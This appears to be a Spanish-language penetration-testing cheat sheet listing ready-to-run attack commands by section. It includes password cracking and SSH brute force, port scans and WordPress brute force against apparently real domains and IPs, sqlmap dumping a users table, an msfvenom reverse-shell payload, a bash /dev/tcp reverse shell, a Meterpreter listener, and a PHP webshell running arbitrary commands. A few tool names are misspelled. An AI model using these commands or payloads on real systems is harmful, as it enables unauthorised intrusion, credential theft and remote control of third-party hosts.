

## HASHES
hashcat -m 0 -a 0 pass.txt /usr/share/wordlists/rockyou.txt --force  
john /usr/share/wordlists/rockyou.txt --format=Raw-SHA256 sha256.txt  
hydra -l root -P /usr/share/wordlists/rockyou.txt -u -s 22 10.1.1.1 ssh  
 
## SCANNERS
nmap -p- --open -T5 -v -n 35.214.200.34  
nmap --script http-enum lamadrid.es -oN webscan  
netdiscover -i eth0  
rustscan -a 10.10.11.105 -b 50 -t 150

## DISCOVER
enum4linux -a 192.168.1.1  
smbclient -L //10.10.10.100 -U name  
/usr/share/doc/python-impacket/examples/GetADUsers.py -all domain.dc/svc_user -dc-ip 10.10.10.1  

## SQLi
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --dbs  
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -D acuart --tables  
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -D acuart -T users --dump  

## WEBs
wpscan --url beehackers.es -U admin -P /usr/share/wordlists/rockyou.txt --random-user-agent -t 4  
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt lamadrid.es/FUZZ   
whatweb https://lamadrid.es   
nıkto -h 10.1.1.1  

## REVERSE
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1 LPORT=444 -f raw > shell.php  
bash -c "bash -i >& /dev/tcp/miIP/PUERTO 0>&1"  

## LISTENER
mfsconsole  
  use exploit/multi/handler  
  set payload windows/meterpreter/reverse_tcp  
nc -lvnp 4444  

## WEBSHELL
```
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
// llamar desde la web: http://IP/shellCMD.php?cmd=ls /home/user
```

## RESOURCES
GTFOBins [diferentes formas de abrir una shell]  
